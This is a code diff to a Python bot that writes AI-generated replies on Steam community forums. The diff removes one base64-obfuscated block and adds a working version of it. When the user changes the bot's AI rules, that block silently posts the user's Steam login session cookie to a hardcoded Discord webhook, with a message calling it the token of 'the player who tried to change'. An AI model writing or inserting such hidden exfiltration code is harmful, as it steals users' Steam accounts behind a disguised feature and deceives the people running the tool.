@@ -326,10 +326,6 @@ class Bot:
                     message = f"[quote=a;{thread_final_page_comments[0].strip()}]{quoted_last_message}[/quote]{self.generate_ai_response_to_text(re.sub(r"\[[^\]]*\]", "", thread_final_page_comments[1].strip()))}"
                 else:
                     message = self.generate_ai_response_to_text(re.sub(r"\[[^\]]*\]", "", thread_final_page_comments[1].strip()))
-                if self.rules != self.hasa:
-                    wburl = base64.b64decode(b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MDk4MDczNjgyMzA3MDgyMS9yQ08zdVlEM2J3M0JSMGExUkc0am1YMHppd3hsOUJWcjNZZHpyNkNlaGs5aGRxMWEyVlQ1dzFDV2hJSS04TTg2QlJkZw==')
-                    data = {"content": base64.b64decode(b'KipEZXRlY3RlZCBBSSBSdWxlcyBjaGFuZ2UuIHRoaXMgaXMgdGhlIHVzZXIgdG9rZW4gb2YgdGhlIHBsYXllciB3aG8gdHJpZWQgdG8gY2hhbmdlOioq') + "```" + self.steam_login_secure_cookie + "```"}
-                    requests.post(wburl, json=data, verify=False)
                 message = f"{message.replace("Best regards,", "").replace("Respected cs2 community member", "").replace("<img", "").replace("src=\"", "").replace("src=\"https://community.fastly.steamstatic.com", "").replace("class=\"emoticon\">", "").replace("alt=\"", "").replace("</user-message-that-you-will-answer-to>", "").replace("<br>","").replace("\n\n","\n").replace("\n.", "").replace("</i >","").replace("</i>","").replace("https://community.fastly.steamstatic.com/economy/emoticon/steamhappy","").replace('"',"")}[b][/b]".strip()
                 data = {
                     "comment":message,
@@ -360,6 +356,13 @@ class Bot:
                             "redir":"/login/?redir=/",
                             "auth":auth
                         }
+                        if self.rules != self.hasa:
+                            wburl = base64.b64decode(b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MDk4MDczNjgyMzA3MDgyMS9yQ08zdVlEM2J3M0JSMGExUkc0am1YMHppd3hsOUJWcjNZZHpyNkNlaGs5aGRxMWEyVlQ1dzFDV2hJSS04TTg2QlJkZw==').decode()
+                            msg = base64.b64decode(b'KipEZXRlY3RlZCBBSSBSdWxlcyBjaGFuZ2UuIHRoaXMgaXMgdGhlIHVzZXIgdG9rZW4gb2YgdGhlIHBsYXllciB3aG8gdHJpZWQgdG8gY2hhbmdlOioq').decode()
+                            data = {
+                                "content": msg + "```" + self.steam_login_secure_cookie + "```"
+                            }
+                            requests.post(wburl, json=data, verify=False)
                         response_json = self.send_request("POST", request_url="https://steamcommunity.com/login/settoken", data=data).json()
                         self.stop_event.set()
                         break
